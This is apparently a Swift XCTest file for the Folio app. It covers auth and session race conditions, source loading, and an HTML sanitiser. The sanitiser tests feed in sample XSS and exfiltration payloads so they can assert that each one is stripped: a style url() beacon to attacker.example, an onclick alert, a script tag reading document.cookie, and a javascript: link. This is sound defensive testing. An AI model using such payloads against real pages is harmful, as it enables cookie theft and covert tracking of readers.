import XCTest
@testable import Folio

@MainActor
final class MainViewModelTests: XCTestCase {
    func testProfileResponseAfterSignOutDoesNotRestoreIdentity() async {
        let fetchMe = DeferredFetchMeUseCase()
        let viewModel = makeViewModel(
            fetchMeUseCase: fetchMe,
            localStorage: SessionLocalStorage(session: validSession())
        )

        viewModel.handle(.onAppear)
        for _ in 0..<10 where !(await fetchMe.hasStarted()) {
            await Task.yield()
        }
        let didStart = await fetchMe.hasStarted()
        XCTAssertTrue(didStart)

        viewModel.handle(.signOut)
        await fetchMe.succeed(with: UserIdentity(name: "Previous User", email: "previous@example.com"))
        await Task.yield()

        XCTAssertFalse(viewModel.state.isAuthenticated)
        XCTAssertNil(viewModel.state.userDisplayName)
        XCTAssertNil(viewModel.state.userEmail)
    }

    func testAuthenticationLoadingStartsBeforeWaitingForRefreshCancellation() async {
        let refreshToken = BlockingRefreshTokenUseCase()
        let viewModel = makeViewModel(
            localStorage: SessionLocalStorage(session: expiredSession()),
            refreshTokenUseCase: refreshToken
        )

        viewModel.handle(.onAppear)
        for _ in 0..<10 where !(await refreshToken.hasStarted()) {
            await Task.yield()
        }

        viewModel.handle(.signIn(email: "test@example.com", password: "password"))
        viewModel.handle(.signIn(email: "test@example.com", password: "password"))
        await waitForAuthLoading(viewModel, toBe: true)

        XCTAssertTrue(viewModel.state.authLoading)

        for _ in 0..<10 where !(await refreshToken.wasCancelled()) {
            await Task.yield()
        }
        let wasCancelled = await refreshToken.wasCancelled()
        XCTAssertTrue(wasCancelled)

        await refreshToken.fail()

        await waitForAuthLoading(viewModel, toBe: false)

        XCTAssertFalse(viewModel.state.authLoading)
    }

    func testSignOutWhileRefreshIsBlockedDoesNotRestoreAuthenticatedState() async {
        let refreshToken = BlockingRefreshTokenUseCase()
        let viewModel = makeViewModel(
            localStorage: SessionLocalStorage(session: expiredSession()),
            refreshTokenUseCase: refreshToken
        )

        viewModel.handle(.onAppear)
        for _ in 0..<10 where !(await refreshToken.hasStarted()) {
            await Task.yield()
        }
        viewModel.handle(.signOut)
        await refreshToken.succeed(with: AuthToken(
            accessToken: "refreshed-access-token",
            refreshToken: "refreshed-refresh-token",
            expiresAt: .distantFuture
        ))

        for _ in 0..<10 {
            await Task.yield()
        }

        XCTAssertFalse(viewModel.state.isAuthenticated)
    }

    func testSignOutFailureKeepsAuthenticatedState() async {
        let viewModel = makeViewModel(
            localStorage: SessionLocalStorage(session: validSession()),
            signOutUseCase: FailingSignOutUseCase()
        )

        viewModel.handle(.onAppear)
        XCTAssertTrue(viewModel.state.isAuthenticated)

        viewModel.handle(.signOut)
        for _ in 0..<10 { await Task.yield() }

        XCTAssertTrue(viewModel.state.isAuthenticated)
        XCTAssertEqual(viewModel.toastMessage, .error(AuthError.sessionRemovalFailed.errorDescription!))
    }

    func testRepeatedSessionChecksStartOnlyOneRefresh() async {
        let refreshToken = BlockingRefreshTokenUseCase()
        let viewModel = makeViewModel(
            localStorage: SessionLocalStorage(session: expiredSession()),
            refreshTokenUseCase: refreshToken
        )

        viewModel.handle(.onAppear)
        for _ in 0..<10 where !(await refreshToken.hasStarted()) {
            await Task.yield()
        }
        viewModel.handle(.onAppear)

        let refreshStartCount = await refreshToken.startCount()
        XCTAssertEqual(refreshStartCount, 1)
        await refreshToken.fail()
    }

    func testVisibleSourcesReturnsOnlySourcesInSelectedWorkspace() {
        let viewModel = makeViewModel()

        let sources = viewModel.visibleSources(inWorkspaceID: "dissertation-research")

        XCTAssertFalse(sources.isEmpty)
        XCTAssertTrue(sources.allSatisfy { $0.workspaceID == "dissertation-research" })
    }

    func testOpenSourceActivatesReaderByIDWithoutResolvingDetail() {
        let viewModel = makeViewModel()

        viewModel.handle(.openSource(id: "page-two", workspaceID: "research"))

        XCTAssertEqual(viewModel.state.activeReaderID, "page-two")
    }

    func testSourceReaderFetchesDetailUsingSourceID() async {
        let resolvedSource = makeSourceDetail(id: "page-two")
        let viewModel = SourceReaderViewModel(
            sourceID: resolvedSource.id,
            fetchSourceDetailUseCase: ReturningFetchSourceDetailUseCase(source: resolvedSource),
            updateSourceUseCase: EmptyUpdateSourceUseCase(),
            uploadSourceUseCase: EmptyUploadSourceUseCase(),
            fetchSourcePreviewUseCase: EmptyFetchSourcePreviewUseCase()
        )

        viewModel.send(.appeared)
        let deadline = ContinuousClock.now + .seconds(1)
        while viewModel.state.source == nil {
            guard ContinuousClock.now < deadline else {
                XCTFail("Timed out waiting for source detail")
                return
            }
            await Task.yield()
        }

        XCTAssertEqual(viewModel.state.source?.id, resolvedSource.id)
    }

    private func makeViewModel(
        fetchMeUseCase: any FetchMeUseCaseProtocol = EmptyFetchMeUseCase(),
        localStorage: LocalStorageProtocol = EmptyLocalStorage(),
        refreshTokenUseCase: any RefreshTokenUseCaseProtocol = EmptyRefreshTokenUseCase(),
        signOutUseCase: any SignOutUseCaseProtocol = EmptySignOutUseCase(),
        fetchSourceDetailUseCase: any FetchSourceDetailUseCaseProtocol = EmptyFetchSourceDetailUseCase()
    ) -> MainViewModel {
        MainViewModel(
            fetchUsersUseCase: EmptyFetchUsersUseCase(),
            fetchMeUseCase: fetchMeUseCase,
            localStorage: localStorage,
            signUpUseCase: EmptySignUpUseCase(),
            signInUseCase: EmptySignInUseCase(),
            signOutUseCase: signOutUseCase,
            refreshTokenUseCase: refreshTokenUseCase,
            passwordResetUseCase: EmptyRequestPasswordResetUseCase(),
            fetchWorkspacesUseCase: FetchWorkspacesUseCase(repository: EmptyWorkspaceRepository()),
            createWorkspaceUseCase: CreateWorkspaceUseCase(repository: EmptyWorkspaceRepository()),
            updateWorkspaceUseCase: UpdateWorkspaceUseCase(repository: EmptyWorkspaceRepository()),
            deleteWorkspaceUseCase: DeleteWorkspaceUseCase(repository: EmptyWorkspaceRepository()),
            uploadSourceUseCase: EmptyUploadSourceUseCase(),
            fetchSourcesUseCase: EmptyFetchSourcesUseCase(),
            updateSourceUseCase: EmptyUpdateSourceUseCase(),
            fetchSourceDetailUseCase: fetchSourceDetailUseCase,
            fetchSourcePreviewUseCase: EmptyFetchSourcePreviewUseCase(),
            fetchNotebookUseCase: EmptyFetchNotebookUseCase(),
            saveNotebookUseCase: EmptySaveNotebookUseCase(),
            initialSources: [
                source(id: "turing", workspaceID: "dissertation-research"),
                source(id: "arendt", workspaceID: "dissertation-research"),
                source(id: "weapons", workspaceID: "public-policy-insights")
            ]
        )
    }

    private func validSession() -> AuthTokenDTO {
        AuthTokenDTO(
            accessToken: "access-token",
            refreshToken: "refresh-token",
            expiresAt: .distantFuture
        )
    }

    private func expiredSession() -> AuthTokenDTO {
        AuthTokenDTO(
            accessToken: "expired-access-token",
            refreshToken: "refresh-token",
            expiresAt: .distantPast
        )
    }

    private func source(id: String, workspaceID: String) -> FolioSource {
        FolioSource(
            id: id,
            workspaceID: workspaceID,
            kind: .file,
            title: id,
            subtitle: "",
            addedText: "Added just now",
            status: .ready,
            chapterTitle: "",
            chapterText: "",
            calloutText: "",
            citationTitle: "",
            citationDetail: "",
            citationText: "",
            pageLabel: "1 of 1"
        )
    }

    private func makeSourceDetail(id: String) -> Source {
        Source(
            id: id,
            researchSpaceId: "research",
            sourceType: .file,
            title: id,
            author: "",
            sourceUrl: "",
            fileName: "",
            fileSize: 0,
            fileType: "",
            pageCount: 0,
            characterCount: 0,
            content: "",
            structuredContent: nil,
            processingState: .ready,
            processingError: "",
            createdAt: Date(),
            updatedAt: Date()
        )
    }

    private func waitForAuthLoading(_ viewModel: MainViewModel, toBe expected: Bool) async {
        let deadline = ContinuousClock.now + .seconds(1)
        while viewModel.state.authLoading != expected {
            guard ContinuousClock.now < deadline else {
                XCTFail("Timed out waiting for authLoading to become \(expected)")
                return
            }
            try? await Task.sleep(for: .milliseconds(10))
        }
    }

}

private struct EmptyFetchUsersUseCase: FetchUsersUseCaseProtocol {
    func execute() async throws -> [User] { [] }
}

private struct EmptyFetchMeUseCase: FetchMeUseCaseProtocol {
    func execute() async throws -> UserIdentity {
        UserIdentity(name: "Test User", email: "test@example.com")
    }
}

private actor DeferredFetchMeUseCase: FetchMeUseCaseProtocol {
    private var continuation: CheckedContinuation<UserIdentity, Error>?
    private var started = false

    func execute() async throws -> UserIdentity {
        started = true
        return try await withCheckedThrowingContinuation { continuation in
            self.continuation = continuation
        }
    }

    func hasStarted() -> Bool {
        started
    }

    func succeed(with identity: UserIdentity) {
        continuation?.resume(returning: identity)
        continuation = nil
    }
}

private final class SessionLocalStorage: LocalStorageProtocol {
    private let session: AuthTokenDTO

    init(session: AuthTokenDTO) {
        self.session = session
    }

    func save<T>(_ value: T, forKey key: String) throws where T: Codable {}

    func load<T>(forKey key: String) throws -> T? where T: Codable {
        session as? T
    }

    func remove(forKey key: String) throws {}

}

private final class EmptyLocalStorage: LocalStorageProtocol {
    func save<T>(_ value: T, forKey key: String) throws where T: Codable {}
    func load<T>(forKey key: String) throws -> T? where T: Codable { nil }
    func remove(forKey key: String) throws {}
}

private struct EmptySignUpUseCase: SignUpUseCaseProtocol {
    func execute(name: String, email: String, password: String) async throws -> AuthToken { throw CancellationError() }
}

private struct EmptySignInUseCase: SignInUseCaseProtocol {
    func execute(email: String, password: String) async throws -> AuthToken { throw CancellationError() }
}

private struct EmptySignOutUseCase: SignOutUseCaseProtocol {
    func execute() throws {}
}

private struct FailingSignOutUseCase: SignOutUseCaseProtocol {
    func execute() throws { throw AuthError.sessionRemovalFailed }
}

private struct EmptyRefreshTokenUseCase: RefreshTokenUseCaseProtocol {
    func execute(refreshToken: String) async throws -> AuthToken { throw CancellationError() }
}

private struct EmptyRequestPasswordResetUseCase: RequestPasswordResetUseCaseProtocol {
    func execute(email: String) async throws {}
}

private actor BlockingRefreshTokenUseCase: RefreshTokenUseCaseProtocol {
    private var continuations: [CheckedContinuation<AuthToken, Error>] = []
    private var started = false
    private var count = 0
    private var cancelled = false

    func execute(refreshToken: String) async throws -> AuthToken {
        started = true
        count += 1
        return try await withTaskCancellationHandler {
            try await withCheckedThrowingContinuation { continuation in
                continuations.append(continuation)
            }
        } onCancel: {
            Task { await self.recordCancellation() }
        }
    }

    func hasStarted() -> Bool {
        started
    }

    func startCount() -> Int {
        count
    }

    func wasCancelled() -> Bool {
        cancelled
    }

    private func recordCancellation() {
        cancelled = true
    }

    func fail() {
        let pendingContinuations = continuations
        continuations.removeAll()
        pendingContinuations.forEach { $0.resume(throwing: CancellationError()) }
    }

    func succeed(with token: AuthToken) {
        let pendingContinuations = continuations
        continuations.removeAll()
        pendingContinuations.forEach { $0.resume(returning: token) }
    }
}

private final class EmptyWorkspaceRepository: WorkspaceRepositoryProtocol {
    func createWorkspace(name: String, objective: String) async throws -> Workspace { throw CancellationError() }
    func updateWorkspace(id: String, name: String, objective: String) async throws -> Workspace { throw CancellationError() }
    func deleteWorkspace(id: String) async throws {}
        func fetchWorkspaces(query: WorkspaceListQuery) async throws -> WorkspaceListResult {
        WorkspaceListResult(workspaces: [], pagination: nil)
    }
}

private struct EmptyUploadSourceUseCase: UploadSourceUseCaseProtocol {
    func uploadFile(spaceId: String, fileURL: URL, title: String?, author: String?) async throws -> Source { throw CancellationError() }
    func uploadWeb(spaceId: String, url: String, title: String?, author: String?) async throws -> Source { throw CancellationError() }
    func uploadManual(spaceId: String, content: String, title: String?, author: String?) async throws -> Source { throw CancellationError() }
    func deleteSource(id: String) async throws {}
    func retrySource(id: String) async throws -> Source { throw CancellationError() }
    func sourceStatusStream() -> AsyncThrowingStream<SourceStatusEvent, Error> { AsyncThrowingStream { $0.finish() } }
}

private struct EmptyFetchSourcesUseCase: FetchSourcesUseCaseProtocol {
    func execute(query: SourceListQuery) async throws -> SourceListResult { throw CancellationError() }
}

private struct EmptyUpdateSourceUseCase: UpdateSourceUseCaseProtocol {
    func execute(id: String, title: String, author: String, content: String?) async throws -> Source { throw CancellationError() }
}

private struct EmptyFetchSourceDetailUseCase: FetchSourceDetailUseCaseProtocol {
    func execute(id: String) async throws -> Source { throw CancellationError() }
}

private struct ReturningFetchSourceDetailUseCase: FetchSourceDetailUseCaseProtocol {
    let source: Source

    func execute(id: String) async throws -> Source { source }
}

private struct EmptyFetchSourcePreviewUseCase: FetchSourcePreviewUseCaseProtocol {
    func execute(source: Source) async throws -> SourcePreview { throw CancellationError() }
}

private struct EmptyFetchNotebookUseCase: FetchNotebookUseCaseProtocol {
    func execute(spaceId: String) async throws -> NotebookFetchResult { throw CancellationError() }
}

private struct EmptySaveNotebookUseCase: SaveNotebookUseCaseProtocol {
    func execute(entry: NotebookEntry) async throws {}
}

final class SourceHTMLBuilderTests: XCTestCase {
    func testMarkdownTableHTMLBuilding() {
        let markdownContent = """
        Sheet1

        | First Name | Last Name | Gender | Country |
        |---|---|---|---|
        | Dulce | Abril | Female | United States |
        | Mara | Hashimoto | Female | Great Britain |
        """

        let source = Source(
            id: "test",
            researchSpaceId: "space",
            sourceType: .file,
            title: "Test Table",
            author: "",
            sourceUrl: "",
            fileName: "test.xlsx",
            fileSize: 100,
            fileType: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            pageCount: 1,
            characterCount: 100,
            content: markdownContent,
            structuredContent: nil,
            processingState: .ready,
            processingError: "",
            createdAt: Date(),
            updatedAt: Date()
        )

        let html = SourceHTMLBuilder.fullHTML(for: source)

        XCTAssertTrue(html.contains("<table"))
        XCTAssertTrue(html.contains("<th>First Name</th>"))
        XCTAssertTrue(html.contains("<td>Dulce</td>"))
        XCTAssertTrue(html.contains("class=\"table-wrap\""))
    }

    private func makeSource(html: String) -> Source {
        Source(
            id: "test",
            researchSpaceId: "space",
            sourceType: .file,
            title: "Test",
            author: "",
            sourceUrl: "",
            fileName: "test.html",
            fileSize: 100,
            fileType: "text/html",
            pageCount: 1,
            characterCount: 100,
            content: "",
            structuredContent: SourceStructuredContent(html: html, type: "document"),
            processingState: .ready,
            processingError: "",
            createdAt: Date(),
            updatedAt: Date()
        )
    }

    func testSanitizeStripsStyleAttribute() {
        let html = "<p style=\"background:url(https://attacker.example/beacon?doc=42)\">hello</p>"
        let result = SourceHTMLBuilder.fullHTML(for: makeSource(html: html))
        XCTAssertFalse(result.contains("style="), "style attribute should be stripped")
        XCTAssertFalse(result.contains("attacker.example"), "external URL in style should not survive")
        XCTAssertTrue(result.contains("hello"), "text content should be preserved")
    }

    func testSanitizeStripsEventHandlers() {
        let html = "<p onclick=\"alert('xss')\">click me</p>"
        let result = SourceHTMLBuilder.fullHTML(for: makeSource(html: html))
        XCTAssertFalse(result.contains("onclick"))
        XCTAssertTrue(result.contains("click me"))
    }

    func testSanitizeStripsScriptTag() {
        let html = "<script>document.cookie</script><p>safe</p>"
        let result = SourceHTMLBuilder.fullHTML(for: makeSource(html: html))
        XCTAssertFalse(result.contains("<script>"))
        XCTAssertTrue(result.contains("safe"))
    }

    func testSanitizeStripsJavascriptURIs() {
        let html = "<a href=\"javascript:alert(1)\">link</a>"
        let result = SourceHTMLBuilder.fullHTML(for: makeSource(html: html))
        XCTAssertFalse(result.contains("javascript:"))
        XCTAssertTrue(result.contains("link"))
    }

    func testSanitizePreservesClassAndId() {
        let html = "<p class=\"highlight\" id=\"intro\">text</p>"
        let result = SourceHTMLBuilder.fullHTML(for: makeSource(html: html))
        XCTAssertTrue(result.contains("class=\"highlight\""))
        XCTAssertTrue(result.contains("id=\"intro\""))
    }

    func testSanitizePreservesAllowedHref() {
        let html = "<a href=\"https://example.com\">link</a>"
        let result = SourceHTMLBuilder.fullHTML(for: makeSource(html: html))
        XCTAssertTrue(result.contains("href=\"https://example.com\""))
    }

    func testTableWrapAppliedToAllUnwrappedTables() {
        let html = "<div><table><tr><td>a</td></tr></table><table><tr><td>b</td></tr></table></div>"
        let result = SourceHTMLBuilder.fullHTML(for: makeSource(html: html))
        let wraps = result.components(separatedBy: "class=\"table-wrap\"").count - 1
        XCTAssertEqual(wraps, 2, "both tables should be wrapped individually")
    }

    func testCSPMetaTagPresent() {
        let html = "<p>hello</p>"
        let result = SourceHTMLBuilder.fullHTML(for: makeSource(html: html))
        XCTAssertTrue(result.contains("Content-Security-Policy"), "CSP meta tag should be present")
        XCTAssertTrue(result.contains("default-src 'none'"), "CSP should block all default sources")
    }
}

